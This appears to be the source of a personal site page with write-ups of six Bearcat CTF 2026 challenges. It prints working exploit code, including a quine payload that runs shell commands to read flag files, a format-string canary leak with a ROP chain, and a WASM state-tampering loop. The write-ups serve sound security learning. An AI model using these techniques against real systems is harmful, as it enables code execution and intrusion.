import CodeBlock from "@/components/ui/CodeBlock";
import ChallengeTag from "@/components/ui/ChallengeTag";
import { Link } from "react-router-dom";
import { ArrowLeft } from "lucide-react";

<div className="mb-8">
  <Link
    to="/"
    className="inline-flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
  >
    <ArrowLeft size={18} />
    <span className="font-mono text-sm">Back</span>
  </Link>
</div>

const BCCTF = () => {
  return (
    <main className="bg-background text-foreground min-h-screen">
      <div className="container mx-auto px-6 py-24 max-w-4xl">

        {/* BACK ARROW */}
        <div className="mb-10">
          <Link
            to="/"
            className="inline-flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
          >
            <ArrowLeft size={18} />
            <span className="font-mono text-sm">Back</span>
          </Link>
        </div>
        {/* TITLE */}
        <h1 className="text-5xl font-mono font-bold">
          Bearcat CTF 2026
        </h1>

        {/* divider */}
        <div className="w-full h-px bg-border my-8"></div>

        {/* DUBIOUS DOUBLOON */}
        <section className="mb-32">

          {/* challenge tag */}
          <div className="mb-3">
            <ChallengeTag label="web" />
          </div>

          <h2 className="text-3xl font-mono font-bold mb-8">
            Dubious Doubloon
          </h2>

          {/* Recon */}
          <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>
          <p className="font-mono text-muted-foreground leading-relaxed mb-6">
            The challenge presented a browser-based coin-flip game where achieving
            a streak of heads was required. However, flips consistently resulted in
            tails, suggesting the outcome logic wasn’t purely probabilistic.
          </p>

          <p className="font-mono text-muted-foreground leading-relaxed mb-6">
            Inspecting the frontend revealed that the game logic was backed by a
            WebAssembly module. The application exposed the following functions:
          </p>

          <ul className="font-mono text-muted-foreground list-disc ml-6 mb-8">
            <li>buy_upgrade()</li>
            <li>flip_coin()</li>
            <li>get_state()</li>
          </ul>

          <p className="font-mono text-muted-foreground leading-relaxed mb-12">
            This indicated that the core game state and logic lived client-side inside
            WASM rather than being enforced server-side.
          </p>

          {/* WASM Analysis */}
          <h3 className="text-xl font-mono font-bold mb-4">WASM Analysis</h3>
          <p className="font-mono text-muted-foreground mb-6">
            Opening the loaded module showed that the exported functions could be
            called directly from the browser console. To enumerate them:
          </p>

          <CodeBlock language="javascript">
{`import("/pkg/unfair_wasm_game.js").then(m => {
  console.log(Object.getOwnPropertyNames(m));
});`}
          </CodeBlock>

          <p className="font-mono text-muted-foreground leading-relaxed mt-6 mb-12">
            This revealed that the upgrade system and coin flip logic were callable
            externally. The UI was just a wrapper — the game engine trusted the client.
          </p>

          {/* State Manipulation */}
          <h3 className="text-xl font-mono font-bold mb-4">State Manipulation</h3>
          <p className="font-mono text-muted-foreground mb-6">
            Instead of playing normally, the approach was to interact directly with
            the WASM instance. The module was initialized manually:
          </p>

          <CodeBlock language="javascript">
{`const mod = await import("/pkg/unfair_wasm_game.js");
const inst = await mod.default();`}
          </CodeBlock>

          <p className="font-mono text-muted-foreground leading-relaxed mb-6">
            Once initialized, the internal memory and exported functions became
            accessible. At this point:
          </p>

          <ul className="font-mono text-muted-foreground list-disc ml-6 mb-12">
            <li>Upgrades could be triggered programmatically</li>
            <li>Flip results could be read directly from memory</li>
            <li>State checks could be bypassed</li>
          </ul>

          <p className="font-mono text-muted-foreground mb-12">
            All ship upgrades were maxed to level 5 using the exposed upgrade interface.
          </p>

          {/* Exploit */}
          <h3 className="text-xl font-mono font-bold mb-4">Exploit</h3>
          <p className="font-mono text-muted-foreground mb-6">
            After upgrades were forced to their maximum level, a brute-force
            interaction loop was used against the WASM coin flip logic.
          </p>

          <CodeBlock language="javascript">
{`const mod = await import("/pkg/unfair_wasm_game.js");
const inst = await mod.default();

for (let mode = 0; mode < 500; mode++) {
  for (let arg = 0; arg < 500; arg++) {
    try {
      const res = inst.flip_coin(mode, arg);
      const mem = new Uint8Array(inst.memory.buffer);

      let text = "";
      for (let i = 0; i < res[1]; i++) {
        text += String.fromCharCode(mem[res[0] + i]);
      }

      if (text.length > 10 && text !== "HEADS" && text !== "TAILS") {
        console.log("RESULT:", text);
        throw "FLAG FOUND";
      }
    } catch (e) {}
  }
}`}
          </CodeBlock>

          <p className="font-mono text-muted-foreground mt-6 mb-12">
            Instead of returning normal outcomes, the WASM memory eventually revealed
            a hidden string.
          </p>

          {/* Flag */}
          <h3 className="text-xl font-mono font-bold mb-4">Flag</h3>
          <CodeBlock language="text">
{`BCCTF{Fl1p&F1sH}`}
          </CodeBlock>

          <p className="font-mono text-muted-foreground mb-12">
            The game’s randomness was never the real obstacle — the flaw was trusting
            client-side WASM for security logic.
          </p>

          {/* Root Cause */}
          <h3 className="text-xl font-mono font-bold mb-4">Root Cause</h3>
          <ul className="font-mono text-muted-foreground list-disc ml-6">
            <li>Storing game state entirely client-side</li>
            <li>Exposing internal WASM functions publicly</li>
            <li>No server-side validation of win conditions</li>
            <li>Allowing direct manipulation via DevTools</li>
          </ul>

        </section>
        <div className="w-full h-px bg-border my-8"></div>
        {/* ================= PNG (Polly_Needs_Grog) ================= */}
<section className="mb-32">

  {/* challenge tag */}
  <div className="mb-3">
    <ChallengeTag label="misc" />
  </div>

  <h2 className="text-3xl font-mono font-bold mb-2">
    PNG (Polly_Needs_Grog)
  </h2>

  <p className="font-mono text-muted-foreground text-sm mb-6">
    Steganography
  </p>


  {/* Recon */}
  <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The challenge provided a PNG image of the ship’s bird behaving strangely,
    hinting that hidden information might be embedded within the image itself.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    Initial inspection showed no metadata, embedded files, or readable strings.
    This suggested the presence of visual steganography rather than file-based hiding.
  </p>


  {/* Original image */}
  <div className="mb-12">
    <img
      src="/images/image.png"
      className="rounded-lg border border-border"
      alt="Original Polly challenge image"
    />
    <p className="font-mono text-xs text-muted-foreground mt-2">
      Original challenge image
    </p>
  </div>


  {/* Channel Analysis */}
  <h3 className="text-xl font-mono font-bold mb-4">Channel Analysis</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The image was analyzed by isolating individual RGB channels to determine
    whether hidden pixel data existed within a specific color plane.
  </p>

  <ul className="font-mono text-muted-foreground list-disc ml-6 mb-12">
    <li>Alpha channel — no hidden data</li>
    <li>Blue channel — empty</li>
    <li>Green channel — empty</li>
    <li>Red channel — abnormal intensity distribution observed</li>
  </ul>


  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    Boosting the red channel’s intensity exposed hidden visual content that
    was not visible in the original RGB composite.
  </p>


  {/* boosted result */}
  <div className="mb-12">
    <img
      src="/images/red_boost.png"
      className="rounded-lg border border-border"
      alt="Red channel boosted revealing hidden flag"
    />
    <p className="font-mono text-xs text-muted-foreground mt-2">
      Red channel intensity boosted — hidden flag becomes visible
    </p>
  </div>


  {/* Flag */}
  <h3 className="text-xl font-mono font-bold mb-4">Flag</h3>
  <CodeBlock language="text">
{`BCCTF{ARRRRRGB_1s_n34T!}`}
  </CodeBlock>


  {/* Conclusion */}
  <p className="font-mono text-muted-foreground mt-6 mb-12">
    The flag was embedded directly within the red color channel and became visible
    only after isolating and amplifying that channel. The image appeared normal
    when viewed as a full RGB composite, effectively masking the hidden data.
  </p>


  {/* Technique */}
  <h3 className="text-xl font-mono font-bold mb-4">Technique</h3>
  <ul className="font-mono text-muted-foreground list-disc ml-6">
    <li>RGB channel separation</li>
    <li>Pixel intensity amplification</li>
    <li>Visual steganography detection</li>
  </ul>

</section>
<div className="w-full h-px bg-border my-8"></div>
{/* ================= The Boy is Quine ================= */}
<section className="mb-32">

  {/* challenge tag */}
  <div className="mb-3">
    <ChallengeTag label="misc" />
  </div>

  <h2 className="text-3xl font-mono font-bold mb-2">
    The Boy is Quine
  </h2>

  {/* Recon */}
  <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The challenge exposed a remote service that prompted the user to submit a quine —
    a program that outputs its own source code when executed.
  </p>

  <CodeBlock language="bash">
{`nc chal.bearcatctf.io 31806`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground leading-relaxed mt-6 mb-12">
    After connecting, the service returned:
  </p>

  <CodeBlock language="text">
{`Give me a quine`}
  </CodeBlock>


  {/* Analysis */}
  <h3 className="text-xl font-mono font-bold mb-4">Analysis</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The service validated whether the submitted code was a true quine by comparing
    the input with the program’s stdout after execution. If it matched exactly,
    the input was accepted.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    Crucially, once accepted, the code was executed again — effectively allowing
    arbitrary Python execution after passing the quine validation step.
  </p>


  {/* Vulnerability */}
  <h3 className="text-xl font-mono font-bold mb-4">Vulnerability</h3>

  <ul className="font-mono text-muted-foreground list-disc ml-6 mb-12">
    <li>User-supplied Python code was executed directly</li>
    <li>Quine validation acted as the only gate</li>
    <li>No sandboxing or syscall restriction</li>
    <li>Code executed again after validation</li>
  </ul>


  {/* Exploit */}
  <h3 className="text-xl font-mono font-bold mb-4">Exploit</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    A Python quine was crafted that printed its own source to satisfy validation
    while embedding a payload to retrieve the flag from common filesystem locations.
  </p>

  <CodeBlock language="python">
{`a='a=%r;import sys,os,getpass;sys.stdout.write(a%%a);getpass.getuser()!="quine" and os.system("cat flag.txt 2>/dev/null || cat /home/quine/flag.txt 2>/dev/null || cat /home/ctf/flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /challenge/flag 2>/dev/null")';import sys,os,getpass;sys.stdout.write(a%a);getpass.getuser()!="quine" and os.system("cat flag.txt 2>/dev/null || cat /home/quine/flag.txt 2>/dev/null || cat /home/ctf/flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /challenge/flag 2>/dev/null")`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground mt-6 mb-12">
    The quine satisfied the equality check, then executed the embedded command,
    resulting in remote command execution and flag retrieval.
  </p>


  {/* Flag */}
  <h3 className="text-xl font-mono font-bold mb-4">Flag</h3>

  <CodeBlock language="text">
{`BCCTF{1t5_mY_t1m3_t0_sh1n3}`}
  </CodeBlock>


  {/* Root Cause */}
  <h3 className="text-xl font-mono font-bold mb-4">Root Cause</h3>

  <ul className="font-mono text-muted-foreground list-disc ml-6">
    <li>Execution of untrusted Python input</li>
    <li>Reliance on quine validation as a security boundary</li>
    <li>No isolation or sandboxing</li>
    <li>Direct filesystem command access via Python runtime</li>
  </ul>

</section>
<div className="w-full h-px bg-border my-8"></div>
{/* ================= DA BROWN'S REVENGE ================= */}
<section className="mb-32">

  {/* challenge tag */}
  <div className="mb-3">
    <ChallengeTag label="misc" />
  </div>

  <h2 className="text-3xl font-mono font-bold mb-2">
    Da Brown's Revenge
  </h2>

  <p className="font-mono text-muted-foreground text-sm mb-6">
    Rolling Code Abuse / Logic Exploit
  </p>


  {/* Recon */}
  <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The service simulated a rolling-code garage-door style authentication
    mechanism. Each request required a binary access string, and the system
    validated whether the correct code appeared within it.
  </p>

  <CodeBlock language="bash">
{`nc chal.bearcatctf.io 19679`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground leading-relaxed mt-6 mb-12">
    After each successful submission, the service reported progress toward
    20 successful validations before revealing the flag.
  </p>


  {/* Behavior Analysis */}
  <h3 className="text-xl font-mono font-bold mb-4">Behavior Analysis</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    Observing responses showed that the server was not verifying equality
    with a generated code, but instead checking whether the correct binary
    sequence appeared anywhere inside the submitted input string.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    This meant the problem was not predicting the rolling code — it was
    ensuring the generated value would appear as a substring of the payload.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    Rather than brute forcing the next code, the goal became constructing a
    binary string guaranteed to contain every possible 12-bit sequence.
  </p>


  {/* Insight */}
  <h3 className="text-xl font-mono font-bold mb-4">Key Insight</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    The challenge effectively reduced to a coverage problem. If the payload
    contained all possible 12-bit combinations, any generated code would be
    matched automatically by the server’s substring check.
  </p>


  {/* Exploit */}
  <h3 className="text-xl font-mono font-bold mb-4">Exploit</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    A De Bruijn sequence was generated for binary values of length 12,
    producing a minimal cyclic string that contains every possible 12-bit
    pattern exactly once.
  </p>

  <CodeBlock language="python">
{`import sys

def debruijn(k, n):
    a = [0]*(k*n)
    sequence = []
    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p+1])
        else:
            a[t] = a[t-p]
            db(t+1, p)
            for j in range(a[t-p]+1, k):
                a[t] = j
                db(t+1, t)
    db(1,1)
    return ''.join(str(i) for i in sequence)

payload = debruijn(2,12)

for _ in range(25):
    print(payload)
    sys.stdout.flush()`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground mt-6 mb-12">
    This payload ensured that every server-generated 12-bit rolling code
    would appear within the submitted string, allowing consecutive
    validations to succeed automatically.
  </p>


  {/* Result */}
  <h3 className="text-xl font-mono font-bold mb-4">Result</h3>

  <CodeBlock language="text">
{`Correct Access Code, 1 out of 20
Correct Access Code, 2 out of 20
...
Correct Access Code, 20 out of 20`}
  </CodeBlock>


  {/* Flag */}
  <h3 className="text-xl font-mono font-bold mb-4">Flag</h3>

  <CodeBlock language="text">
{`BCCTF{i_5pelled_de_brujin_wr0ng_7689472}`}
  </CodeBlock>


  {/* Root Cause */}
  <h3 className="text-xl font-mono font-bold mb-4">Root Cause</h3>

  <ul className="font-mono text-muted-foreground list-disc ml-6">
    <li>Rolling code verified via substring search</li>
    <li>No requirement for exact match</li>
    <li>No rate limiting or attempt validation</li>
    <li>Predictability replaced by coverage exploit</li>
  </ul>

</section>
<div className="w-full h-px bg-border my-8"></div>
{/* ================= TREASURE HUNTER ================= */}
<section className="mb-32">

  {/* challenge tag */}
  <div className="mb-3">
    <ChallengeTag label="pwn" />
  </div>

  <h2 className="text-3xl font-mono font-bold mb-2">
    Treasure Hunter
  </h2>

  <p className="font-mono text-muted-foreground text-sm mb-6">
    Format String Leak → Canary Bypass → ROP Chain
  </p>


  {/* Recon */}
  <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>

  <CodeBlock language="bash">
{`nc chal.bearcatctf.io 28799`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground leading-relaxed mt-6 mb-6">
    The service prompted for a name before asking for the treasure location.
  </p>

  <CodeBlock language="text">
{`Welcome pirate!
But first what is your name pirate?`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    The name input was directly reflected back without sanitization,
    indicating a potential format string vulnerability.
  </p>


  {/* Stage 1 */}
  <h3 className="text-xl font-mono font-bold mb-4">Stage 1 — Canary Leak</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    Supplying a format string such as <code>%13$p</code> revealed stack values.
    This allowed extraction of the stack canary required to bypass stack protection.
  </p>

  <CodeBlock language="python">
{`p.recvuntil(b"name pirate? ")
p.sendline(b"%13$p")

p.recvuntil(b"Hello ")
canary = int(p.recvline().strip().split(b"0x")[1], 16)`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground mt-6 mb-12">
    The leaked value was the stack canary, which protects against buffer overflows.
  </p>


  {/* Stage 2 */}
  <h3 className="text-xl font-mono font-bold mb-4">Stage 2 — Buffer Overflow</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    After leaking the canary, the second input prompt allowed overflowing
    a buffer controlling the return address.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The exploit preserved the correct canary value and constructed
    a ROP chain to redirect execution to the hidden win function.
  </p>

  <CodeBlock language="python">
{`payload  = b"A"*40
payload += p64(canary)
payload += b"B"*8
payload += p64(pop_rdi)
payload += p64(6)
payload += p64(pop_rsi)
payload += p64(7)
payload += p64(win)

p.send(payload + b"\n")`}
  </CodeBlock>


  {/* Result */}
  <h3 className="text-xl font-mono font-bold mb-4">Result</h3>

  <CodeBlock language="text">
{`You found the treasure BCCTF{rOp_cHaIn_hAs_BeEn_pWnEd}`}
  </CodeBlock>


  {/* Root Cause */}
  <h3 className="text-xl font-mono font-bold mb-4">Root Cause</h3>

  <ul className="font-mono text-muted-foreground list-disc ml-6">
    <li>Format string vulnerability allowed stack disclosure</li>
    <li>Stack canary leaked from memory</li>
    <li>Buffer overflow enabled return address control</li>
    <li>No PIE (predictable function addresses)</li>
  </ul>

</section>
<div className="w-full h-px bg-border my-8"></div>
{/* ================= FAVORITE PROGRAMMING LANGUAGE ================= */}
<section className="mb-32">

  <div className="mb-3">
    <ChallengeTag label="rev" />
  </div>

  <h2 className="text-3xl font-mono font-bold mb-2">
    What's a Pirate's Favorite Programming Language?
  </h2>

  <p className="font-mono text-muted-foreground text-sm mb-6">
    Reverse Engineering
  </p>


  {/* Recon */}
  <h3 className="text-xl font-mono font-bold mb-4">Recon</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The challenge provided a binary along with a hint referencing multiple
    programming languages except C, implying input validation logic.
  </p>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    Running <span className="text-foreground">strings</span> on the binary revealed
    an embedded constant string and transformation logic.
  </p>

  <CodeBlock language="bash">
{`strings FavoriteProgrammingLanguage`}
  </CodeBlock>


  {/* Analysis */}
  <h3 className="text-xl font-mono font-bold mb-4">Binary Analysis</h3>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The binary compared transformed user input against the constant:
  </p>

  <CodeBlock language="text">
{`CA@PC}Wz:~<uR;[_?T;}[XE$%2#|`}
  </CodeBlock>

  <p className="font-mono text-muted-foreground leading-relaxed mb-6">
    The transformation applied a position-dependent XOR operation:
  </p>

  <ul className="font-mono text-muted-foreground list-disc ml-6 mb-12">
    <li>Characters 1–14 → XOR with index <code>i</code></li>
    <li>Characters 15–28 → XOR with <code>(29 - i)</code></li>
  </ul>

  <p className="font-mono text-muted-foreground leading-relaxed mb-12">
    Since XOR is reversible (<code>A ^ B ^ B = A</code>), the operation
    could be inverted to recover the original input string.
  </p>


  {/* Solver Script */}
  <h3 className="text-xl font-mono font-bold mb-4">Reversing Script</h3>

  <CodeBlock language="python">
{`ct = "CA@PC}Wz:~<uR;[_?T;}[XE$%2#|"

result = []

for i, c in enumerate(ct):
    ascii_val = ord(c)

    if i < 14:
        mask = i + 1
    else:
        mask = 29 - (i + 1)

    original = ascii_val ^ mask
    result.append(chr(original))

print("".join(result))`}
  </CodeBlock>


  {/* Flag */}
  <h3 className="text-xl font-mono font-bold mb-4">Flag</h3>

  <CodeBlock language="text">
{`BCCTF{Pr3t7y_5UR3_1tS_C!!1!}`}
  </CodeBlock>


  {/* Root Cause */}
  <h3 className="text-xl font-mono font-bold mb-4">Root Cause</h3>

  <ul className="font-mono text-muted-foreground list-disc ml-6">
    <li>Flag derivation logic embedded directly in binary</li>
    <li>Position-based XOR masking</li>
    <li>Reversible transformation with no additional obfuscation</li>
    <li>Static analysis sufficient for recovery</li>
  </ul>

</section>
      </div>
    </main>
  );
};

export default BCCTF;